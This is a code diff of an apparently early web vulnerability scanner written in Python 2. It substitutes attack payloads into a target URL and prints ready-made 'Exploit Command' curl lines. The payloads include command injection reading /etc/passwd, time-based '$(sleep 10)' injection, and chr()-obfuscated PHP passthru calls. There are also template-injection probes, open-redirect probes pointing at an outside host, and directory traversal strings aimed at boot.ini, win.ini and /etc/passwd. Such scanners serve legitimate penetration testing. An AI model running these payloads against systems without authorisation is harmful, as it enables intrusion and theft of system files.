-            if (idor_length_list[0] != idor_length_list[1]) or (idor_length_list[1] != idor_length_list[2]) or (idor_length_list[0] != idor_length_list[2]):
-                print(OKRED + "[+] Possible IDOR Found! " + RESET)
-                print(OKRED + "[+] Vulnerable URL: " + idor_url + RESET)
-                print(OKGREEN + "[c] Exploit Command: curl -s '" + idor_url + "'")
-            else:
-                print(COLOR1 + "[F] IDOR Failed." + RESET)
-        except:
-            pass
+    #idor_list = [1,2,3]
+    #idor_length_list = []
+    #for idor in idor_list:
+    #    try:
+    #        idor_exploit = str(idor)
+    #        # print COLOR2 + "[i] Trying Payload: " + str(idor) + RESET
+    #        idor_url = new_url.replace("INJECTX", idor_exploit)
+    #        http_request = urllib.urlopen(idor_url)
+    #        http_response = http_request.read()
+    #        http_length = len(http_response)
+    #        http_status = http_request.getcode()
+    #        idor_length_list.append(http_length)
+    #        http_length_diff = str(http_length_base - http_length)
+    #        #print(COLOR2 + "[i] New URL: " + idor_url + " [" + OKRED + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
+    #
+    #        if (idor_length_list[0] != idor_length_list[1]) or (idor_length_list[1] != idor_length_list[2]) or (idor_length_list[0] != idor_length_list[2]):
+    #            print(OKRED + "[+] Possible IDOR Found! " + RESET)
+    #            print(OKRED + "[+] Vulnerable URL: " + idor_url + RESET)
+    #            print(OKGREEN + "[c] Exploit Command: curl -s '" + idor_url + "'")
+    #        #else:
+    #            #print(COLOR1 + "[F] IDOR Failed." + RESET)
+    #    except:
+    #        pass
 
     # Buffer Overflow Check ######################################################################################
     #try:
@@ -424,68 +533,73 @@ def active_scan():
     # SSTI Check ######################################################################################
     try:
         ssti_exploit = urllib.quote_plus("{{1336%2B1}}")
-        # print COLOR2 + "[i] Trying Payload: " + str(ssti_exploit) + RESET
+        #if (verbose == "y"):
+            #print(COLOR2 + "[i] Trying Payload: " + str(ssti_exploit) + RESET)
         ssti_url = new_url.replace("INJECTX", ssti_exploit)
         http_request = urllib.urlopen(ssti_url)
         http_response = http_request.read()
         http_length = len(http_response)
         http_length_diff = str(http_length_base - http_length)
         http_status = http_request.getcode()
-        print(COLOR2 + "[i] New URL: " + ssti_url + " [" + OKRED + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
+        if (verbose == "y"):
+            print(COLOR2 + "[i] New URL: " + ssti_url + " [" + OKRED + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
 
         if "1337" in http_response:
             print(OKRED + "[+] Server Side Template Injection Found! " + RESET)
             print(OKRED + "[+] Vulnerable URL: " + ssti_url + RESET)
             print(OKGREEN + "[c] Exploit Command: curl -s '" + ssti_url + "' | egrep 1337 --color=auto")
-        else:
-            print(COLOR1 + "[F] Server Side Template Injection Failed." + RESET)
+        #else:
+            #print(COLOR1 + "[F] Server Side Template Injection Failed." + RESET)
     except:
         pass
-
 
 
     # SSTI Check 2 ######################################################################################
     try:
         ssti_exploit = urllib.quote_plus("1336+1")
-        # print COLOR2 + "[i] Trying Payload: " + str(ssti_exploit) + RESET
+        #if (verbose == "y"):
+            #print(COLOR2 + "[i] Trying Payload: " + str(ssti_exploit) + RESET)
+
         ssti_url = new_url.replace("INJECTX", ssti_exploit)
         http_request = urllib.urlopen(ssti_url)
         http_response = http_request.read()
         http_length = len(http_response)
         http_length_diff = str(http_length_base - http_length)
         http_status = http_request.getcode()
-        print(COLOR2 + "[i] New URL: " + ssti_url + " [" + OKRED + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
+        if (verbose == "y"):
+            print(COLOR2 + "[i] New URL: " + ssti_url + " [" + OKRED + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
 
         if "1337" in http_response:
             print(OKRED + "[+] Server Side Template Injection Found! " + RESET)
             print(OKRED + "[+] Vulnerable URL: " + ssti_url + RESET)
             print(OKGREEN + "[c] Exploit Command: curl -s '" + ssti_url + "' | egrep 1337 --color=auto")
-        else:
-            print(COLOR1 + "[F] Server Side Template Injection Failed." + RESET)
+        #else:
+            #print(COLOR1 + "[F] Server Side Template Injection Failed." + RESET)
     except:
         pass
-
-
 
 
     # RCE Linux Check ######################################################################################
     try:
         rce_exploit = urllib.quote_plus("$(cat+/etc/passwd)")
-        # print COLOR2 + "[i] Trying Payload: " + str(ssti_exploit) + RESET
+        #if (verbose == "y"):
+            #print(COLOR2 + "[i] Trying Payload: " + str(ssti_exploit) + RESET)
+
         rce_url = new_url.replace("INJECTX", rce_exploit)
         http_request = urllib.urlopen(rce_url)
         http_response = http_request.read()
         http_length = len(http_response)
         http_length_diff = str(http_length_base - http_length)
         http_status = http_request.getcode()
-        print(COLOR2 + "[i] New URL: " + rce_url + " [" + OKRED + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
+        if (verbose == "y"):
+            print(COLOR2 + "[i] New URL: " + rce_url + " [" + OKRED + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
 
         if "root:" in http_response:
             print(OKRED + "[+] Linux Command Injection Found! " + RESET)
             print(OKRED + "[+] Vulnerable URL: " + rce_url + RESET)
             print(OKGREEN + "[c] Exploit Command: curl -s '" + rce_url + "' | egrep root: --color=auto")
-        else:
-            print(COLOR1 + "[F] Linux Command Injection Failed." + RESET)
+        #else:
+            #print(COLOR1 + "[F] Linux Command Injection Failed." + RESET)
     except:
         pass
 
@@ -493,105 +607,132 @@ def active_scan():
     # RCE Linux Check 2 ######################################################################################
     try:
         rce_exploit = urllib.quote_plus("$(sleep+10)")
-        # print COLOR2 + "[i] Trying Payload: " + str(ssti_exploit) + RESET
+        #if (verbose == "y"):
+            #print(COLOR2 + "[i] Trying Payload: " + str(ssti_exploit) + RESET)
+
         rce_url = new_url.replace("INJECTX", rce_exploit)
         http_request = urllib.urlopen(rce_url)
         http_response = http_request.read()
         http_length = len(http_response)
         http_length_diff = str(http_length_base - http_length)
         http_status = http_request.getcode()
-        print(COLOR2 + "[i] New URL: " + rce_url + " [" + OKRED + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
+        if (verbose == "y"):
+            print(COLOR2 + "[i] New URL: " + rce_url + " [" + OKRED + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
 
         if "root:" in http_response:
             print(OKRED + "[+] Linux Time Based Command Injection Found! " + RESET)
             print(OKRED + "[+] Vulnerable URL: " + rce_url + RESET)
             print(OKGREEN + "[c] Exploit Command: curl -s '" + rce_url + "' | egrep root: --color=auto")
-        else:
-            print(COLOR1 + "[F] Linux Time Based Command Injection Failed." + RESET)
+        #else:
+            #print(COLOR1 + "[F] Linux Time Based Command Injection Failed." + RESET)
     except:
         pass
-
-
-
 
 
     # RCE PHP Check ######################################################################################
     try:
         rce_exploit = urllib.quote_plus("phpinfo()")
-        # print COLOR2 + "[i] Trying Payload: " + str(ssti_exploit) + RESET
+        #if (verbose == "y"):
+            #print(COLOR2 + "[i] Trying Payload: " + str(ssti_exploit) + RESET)
+
         rce_url = new_url.replace("INJECTX", rce_exploit)
         http_request = urllib.urlopen(rce_url)
         http_response = http_request.read()
         http_length = len(http_response)
         http_length_diff = str(http_length_base - http_length)
         http_status = http_request.getcode()
-        print(COLOR2 + "[i] New URL: " + rce_url + " [" + OKRED + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
+        if (verbose == "y"):
+            print(COLOR2 + "[i] New URL: " + rce_url + " [" + OKRED + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
 
         if "<title>phpinfo()</title>" in http_response:
             print(OKRED + "[+] Generic PHP Command Injection Found! " + RESET)
             print(OKRED + "[+] Vulnerable URL: " + rce_url + RESET)
             print(OKGREEN + "[c] Exploit Command: curl -s '" + rce_url + "' | egrep PHP --color=auto")
-        else:
-            print(COLOR1 + "[F] Generic PHP Command Injection Failed." + RESET)
+        #else:
+            #print(COLOR1 + "[F] Generic PHP Command Injection Failed." + RESET)
     except:
         pass
-
 
 
     # RCE PHP Check 2 ######################################################################################
     try:
         rce_exploit = urllib.quote_plus('{${passthru(chr(99).chr(97).chr(116).chr(32).chr(47).chr(101).chr(116).chr(99).chr(47).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100))}}{${exit()}}')
-        # print COLOR2 + "[i] Trying Payload: " + str(ssti_exploit) + RESET
+        #if (verbose == "y"):
+            #print(COLOR2 + "[i] Trying Payload: " + str(ssti_exploit) + RESET)
+
         rce_url = new_url.replace("INJECTX", rce_exploit)
         http_request = urllib.urlopen(rce_url)
         http_response = http_request.read()
         http_length = len(http_response)
         http_length_diff = str(http_length_base - http_length)
         http_status = http_request.getcode()
-        print(COLOR2 + "[i] New URL: " + rce_url + " [" + OKRED + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
+        if (verbose == "y"):
+            print(COLOR2 + "[i] New URL: " + rce_url + " [" + OKRED + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
 
         if "root:" in http_response:
             print(OKRED + "[+] Linux PHP Command Injection Found! " + RESET)
             print(OKRED + "[+] Vulnerable URL: " + rce_url + RESET)
             print(OKGREEN + "[c] Exploit Command: curl -s '" + rce_url + "' | egrep root: --color=auto")
-        else:
-            print(COLOR1 + "[F] Linux PHP Command Injection Failed." + RESET)
+        #else:
+            #print(COLOR1 + "[F] Linux PHP Command Injection Failed." + RESET)
     except:
         pass
-
-
 
 
     # RCE PHP Check 3 ######################################################################################
     try:
         rce_exploit = urllib.quote_plus('{${passthru(chr(115).chr(108).chr(101).chr(101).chr(112).chr(32).chr(49).chr(48))}}{${exit()}}')
-        # print COLOR2 + "[i] Trying Payload: " + str(ssti_exploit) + RESET
+        #if (verbose == "y"):
+            #print(COLOR2 + "[i] Trying Payload: " + str(ssti_exploit) + RESET)
+
         rce_url = new_url.replace("INJECTX", rce_exploit)
         http_request = urllib.urlopen(rce_url)
         http_response = http_request.read()
         http_length = len(http_response)
         http_length_diff = str(http_length_base - http_length)
         http_status = http_request.getcode()
-        print(COLOR2 + "[i] New URL: " + rce_url + " [" + OKRED + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
+        if (verbose == "y"):
+            print(COLOR2 + "[i] New URL: " + rce_url + " [" + OKRED + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
 
         if "root:" in http_response:
             print(OKRED + "[+] PHP Command Injection Found! " + RESET)
             print(OKRED + "[+] Vulnerable URL: " + rce_url + RESET)
             print(OKGREEN + "[c] Exploit Command: curl -s '" + rce_url + "' | egrep root: --color=auto")
-        else:
-            print(COLOR1 + "[F] PHP Command Injection Failed." + RESET)
+        #else:
+            #print(COLOR1 + "[F] PHP Command Injection Failed." + RESET)
     except:
         pass
 
 
-logo()
+#logo()
+if len(sys.argv) < 2:
+    print("You need to specify a URL to scan (ie. -u https://site.com). Use --help for all options.")
+    quit()
+else:
+    parser = optparse.OptionParser()
+    parser.add_option('-u', '--url',
+      action="store", dest="url",
+      help="Full URL to spider", default="")
 
-full_url = sys.argv[1]
+    parser.add_option('-c', '--cookie',
+      action="store", dest="cookie",
+      help="Cookies to send", default="")
+
+    parser.add_option('-v', '--verbose',
+      action="store", dest="verbose",
+      help="Set verbose mode ON", default="n")
+
+
+options, args = parser.parse_args()
+cookies = str(options.cookie)
+verbose = str(options.verbose)
+full_url = str(options.url)
 payload = "INJECTX"
-http_request_base = urllib.urlopen(full_url, context=ssl._create_unverified_context())
+http_request_base = urllib.urlopen(full_url)
 http_response_base = http_request_base.read()
 http_length_base = len(http_response_base)
 http_status_base = http_request_base.getcode()
+
 
 print(RESET)
 print(COLOR3 + ">>> " + OKORANGE + full_url + COLOR2 + " [" + OKRED + str(http_status_base) + COLOR2 + "]" + " [" + COLOR3 + str(http_length_base) + COLOR2 + "]" + RESET)
@@ -679,7 +820,277 @@ else:
         except:
             pass
     else:
-        print(COLOR2 + "[i] URL does not appear to be dynamic..." + RESET)
+        #print(COLOR2 + "[i] URL does not appear to be dynamic..." + RESET)
+
+
+        # PUT EVERYTHING BACK TOGETHER
+        new_url = full_url + 'INJECTX'
+
+        # Open Redirect ######################################################################################
+        #redirect_exploit = "hTtP://tests.arachni-scanner.com/rfi.md5.txt"
+        redirect_exploit = '//32lp3si8w5pc.runscope.net'
+        #if (verbose == "y"):
+            #print (COLOR2 + "[i] Trying Payload: " + str(redirect_exploit) + RESET)
+        redirect_url = new_url.replace("INJECTX", redirect_exploit)
+
+        
+        http_request = urllib.urlopen(redirect_url)
+        http_response = http_request.read()
+        http_length = len(http_response)
+        http_status = http_request.getcode()
+        http_length_diff = str(http_length_base - http_length)
+        if (verbose == "y"):
+            print(COLOR2 + "[i] New URL: " + redirect_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
+
+        if "runscope_host" in http_response or "error_code" in http_response:
+            print(OKRED + "[+] Open Redirect Found! " + RESET)
+            print(OKRED + "[+] Vulnerable URL: " + redirect_url + RESET)
+            print(OKGREEN + "[c] Exploit Command: curl -s -I '" + redirect_url + "' | egrep location --color=auto")
+        #else:
+            #print(COLOR1 + "[F] Open Redirect Failed." + RESET)
+
+
+
+        # PUT EVERYTHING BACK TOGETHER
+        new_url = full_url + 'INJECTX'
+
+        # Open Redirect ######################################################################################
+        #redirect_exploit = "hTtP://tests.arachni-scanner.com/rfi.md5.txt"
+        redirect_exploit = '/<>//32lp3si8w5pc.runscope.net'
+        #if (verbose == "y"):
+            #print(COLOR2 + "[i] Trying Payload: " + str(redirect_exploit) + RESET)
+        redirect_url = new_url.replace("INJECTX", redirect_exploit)
+
+        
+        http_request = urllib.urlopen(redirect_url)
+        http_response = http_request.read()
+        http_length = len(http_response)
+        http_status = http_request.getcode()
+        http_length_diff = str(http_length_base - http_length)
+        if (verbose == "y"):
+            print(COLOR2 + "[i] New URL: " + redirect_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
+
+        if "runscope_host" in http_response or "error_code" in http_response:
+            print(OKRED + "[+] Open Redirect Found! " + RESET)
+            print(OKRED + "[+] Vulnerable URL: " + redirect_url + RESET)
+            print(OKGREEN + "[c] Exploit Command: curl -s -I '" + redirect_url + "' | egrep location --color=auto")
+        #else:
+            #print(COLOR1 + "[F] Open Redirect Failed." + RESET)
+
+
+        # PUT EVERYTHING BACK TOGETHER
+        new_url = full_url + 'INJECTX'
+
+        # Open Redirect ######################################################################################
+        #redirect_exploit = "hTtP://tests.arachni-scanner.com/rfi.md5.txt"
+        redirect_exploit = '/%252F%252F32lp3si8w5pc.runscope.net'
+        #if (verbose == "y"):
+            #print(COLOR2 + "[i] Trying Payload: " + str(redirect_exploit) + RESET)
+
+        redirect_url = new_url.replace("INJECTX", redirect_exploit)
+
+        
+        http_request = urllib.urlopen(redirect_url)
+        http_response = http_request.read()
+        http_length = len(http_response)
+        http_status = http_request.getcode()
+        http_length_diff = str(http_length_base - http_length)
+        if (verbose == "y"):
+            print(COLOR2 + "[i] New URL: " + redirect_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
+
+        if "runscope_host" in http_response or "error_code" in http_response:
+            print(OKRED + "[+] Open Redirect Found! " + RESET)
+            print(OKRED + "[+] Vulnerable URL: " + redirect_url + RESET)
+            print(OKGREEN + "[c] Exploit Command: curl -s -I '" + redirect_url + "' | egrep location --color=auto")
+        #else:
+            #print(COLOR1 + "[F] Open Redirect Failed." + RESET)
+
+
+        # PUT EVERYTHING BACK TOGETHER
+        new_url = full_url + 'INJECTX'
+
+        # Open Redirect ######################################################################################
+        #redirect_exploit = "hTtP://tests.arachni-scanner.com/rfi.md5.txt"
+        redirect_exploit = '////32lp3si8w5pc.runscope.net/%2e%2e'
+        #if (verbose == "y"):
+            #print(COLOR2 + "[i] Trying Payload: " + str(redirect_exploit) + RESET)
+
+        redirect_url = new_url.replace("INJECTX", redirect_exploit)
+
+        
+        http_request = urllib.urlopen(redirect_url)
+        http_response = http_request.read()
+        http_length = len(http_response)
+        http_status = http_request.getcode()
+        http_length_diff = str(http_length_base - http_length)
+        if (verbose == "y"):
+            print(COLOR2 + "[i] New URL: " + redirect_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
+
+        if "runscope_host" in http_response or "error_code" in http_response:
+            print(OKRED + "[+] Open Redirect Found! " + RESET)
+            print(OKRED + "[+] Vulnerable URL: " + redirect_url + RESET)
+            print(OKGREEN + "[c] Exploit Command: curl -s -I '" + redirect_url + "' | egrep location --color=auto")
+        #else:
+            #print(COLOR1 + "[F] Open Redirect Failed." + RESET)
+
+
+        # PUT EVERYTHING BACK TOGETHER
+        new_url = full_url + 'INJECTX'
+
+        # Open Redirect ######################################################################################
+        #redirect_exploit = "hTtP://tests.arachni-scanner.com/rfi.md5.txt"
+        redirect_exploit = '/https:/%5c32lp3si8w5pc.runscope.net/'
+        #if (verbose == "y"):
+            #print(COLOR2 + "[i] Trying Payload: " + str(redirect_exploit) + RESET)
+
+        redirect_url = new_url.replace("INJECTX", redirect_exploit)
+
+        
+        http_request = urllib.urlopen(redirect_url)
+        http_response = http_request.read()
+        http_length = len(http_response)
+        http_status = http_request.getcode()
+        http_length_diff = str(http_length_base - http_length)
+        if (verbose == "y"):
+            print(COLOR2 + "[i] New URL: " + redirect_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
+
+        if "runscope_host" in http_response or "error_code" in http_response:
+            print(OKRED + "[+] Open Redirect Found! " + RESET)
+            print(OKRED + "[+] Vulnerable URL: " + redirect_url + RESET)
+            print(OKGREEN + "[c] Exploit Command: curl -s -I '" + redirect_url + "' | egrep location --color=auto")
+        #else:
+            #print(COLOR1 + "[F] Open Redirect Failed." + RESET)
+
+
+
+        # PUT EVERYTHING BACK TOGETHER
+        new_url = full_url + 'INJECTX'
+
+        # Windows Directory Traversal ######################################################################################
+        traversal_exploit = urllib.quote_plus('..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\\boot.ini')
+        #if (verbose == "y"):
+            #print(COLOR2 + "[i] Trying Payload: " + str(traversal_exploit) + RESET)
+
+        traversal_url = new_url.replace("INJECTX", traversal_exploit)
+        http_request = urllib.urlopen(traversal_url)
+        http_response = http_request.read()
+        http_length = len(http_response)
+        http_length_diff = str(http_length_base - http_length)
+        http_status = http_request.getcode()
+        if (verbose == "y"):
+            print(COLOR2 + "[i] New URL: " + traversal_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
+
+        if "boot loader" in http_response or "16-bit" in http_response:
+            print(OKRED + "[+] Windows Directory Traversal Found! " + RESET)
+            print(OKRED + "[+] Vulnerable URL: " + traversal_url + RESET)
+            print(OKGREEN + "[c] Exploit Command: curl -s '" + traversal_url + "' | egrep Windows --color=auto")
+        #else:
+            #print(COLOR1 + "[F] Windows Directory Traversal Failed." + RESET)
+
+
+
+        # PUT EVERYTHING BACK TOGETHER
+        new_url = full_url + 'INJECTX'
+
+        # Windows Directory Traversal 2 ######################################################################################
+        traversal_exploit = urllib.quote_plus('..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\\boot.ini%00')
+        #if (verbose == "y"):
+            #print(COLOR2 + "[i] Trying Payload: " + str(traversal_exploit) + RESET)
+
+        traversal_url = new_url.replace("INJECTX", traversal_exploit)
+        http_request = urllib.urlopen(traversal_url)
+        http_response = http_request.read()
+        http_length = len(http_response)
+        http_length_diff = str(http_length_base - http_length)
+        http_status = http_request.getcode()
+        if (verbose == "y"):
+            print(COLOR2 + "[i] New URL: " + traversal_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
+
+        if "boot loader" in http_response or "16-bit" in http_response:
+            print(OKRED + "[+] Windows Directory Traversal Found! " + RESET)
+            print(OKRED + "[+] Vulnerable URL: " + traversal_url + RESET)
+            print(OKGREEN + "[c] Exploit Command: curl -s '" + traversal_url + "' | egrep Windows --color=auto")
+        #else:
+            #print(COLOR1 + "[F] Windows Directory Traversal + NULL Byte Failed." + RESET)
+
+
+        # PUT EVERYTHING BACK TOGETHER
+        new_url = full_url + 'INJECTX'
+
+
+        # Windows Directory Traversal 3 ######################################################################################
+        try:
+            traversal_exploit = '..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00test.htm'
+            #if (verbose == "y"):
+                #print(COLOR2 + "[i] Trying Payload: " + str(traversal_exploit) + RESET)
+
+            traversal_url = new_url.replace("INJECTX", traversal_exploit)
+            http_request = urllib.urlopen(traversal_url)
+            http_response = http_request.read()
+            http_length = len(http_response)
+            http_length_diff = str(http_length_base - http_length)
+            http_status = http_request.getcode()
+            if (verbose == "y"):
+                print(COLOR2 + "[i] New URL: " + traversal_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
+
+            if "boot loader" in http_response or "16-bit" in http_response:
+                print(OKRED + "[+] Windows Directory Traversal Found! " + RESET)
+                print(OKRED + "[+] Vulnerable URL: " + traversal_url + RESET)
+                print(OKGREEN + "[c] Exploit Command: curl -s '" + traversal_url + "' | egrep Windows --color=auto")
+            #else:
+                #print(COLOR1 + "[F] Windows Directory Traversal + NULL Byte Failed." + RESET)
+        except:
+            pass
+
+
+
+        # Linux Directory Traversal ######################################################################################
+        traversal_exploit = urllib.quote_plus("/../../../../../../../../../../../../../../../../../etc/passwd")
+        #if (verbose == "y"):
+            #print(COLOR2 + "[i] Trying Payload: " + str(traversal_exploit) + RESET)
+
+        traversal_url = new_url.replace("INJECTX", traversal_exploit)
+        http_request = urllib.urlopen(traversal_url)
+        http_response = http_request.read()
+        http_length = len(http_response)
+        http_length_diff = str(http_length_base - http_length)
+        http_status = http_request.getcode()
+        if (verbose == "y"):
+            print(COLOR2 + "[i] New URL: " + traversal_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
+
+        if "root:" in http_response:
+            print(OKRED + "[+] Linux Directory Traversal Found! " + RESET)
+            print(OKRED + "[+] Vulnerable URL: " + traversal_url + RESET)
+            print(OKGREEN + "[c] Exploit Command: curl -s '" + traversal_url + "' | egrep root --color=auto")
+        #else:
+            #print(COLOR1 + "[F] Linux Directory Traversal Failed." + RESET)
+
+
+        # PUT EVERYTHING BACK TOGETHER
+        new_url = full_url + 'INJECTX'
+
+        # Linux Directory Traversal 2 ######################################################################################
+
+        traversal_exploit = urllib.quote_plus("/../../../../../../../../../../../../../../../../../etc/passwd%00")
+        #if (verbose == "y"):
+            #print(COLOR2 + "[i] Trying Payload: " + str(traversal_exploit) + RESET)
+
+        traversal_url = new_url.replace("INJECTX", traversal_exploit)
+        http_request = urllib.urlopen(traversal_url)
+        http_response = http_request.read()
+        http_length = len(http_response)
+        http_length_diff = str(http_length_base - http_length)
+        http_status = http_request.getcode()
+        if (verbose == "y"):
+            print(COLOR2 + "[i] New URL: " + traversal_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
+
+        if "root:" in http_response:
+            print(OKRED + "[+] Linux Directory Traversal Found! " + RESET)
+            print(OKRED + "[+] Vulnerable URL: " + traversal_url + RESET)
+            print(OKGREEN + "[c] Exploit Command: curl -s '" + traversal_url + "' | egrep root --color=auto")
+        #else:
+            #print(COLOR1 + "[F] Linux Directory Traversal + NULL Byte Failed." + RESET)
+
 
 
 print(OKORANGE + "______________________________________________________________________________________________________" + RESET)
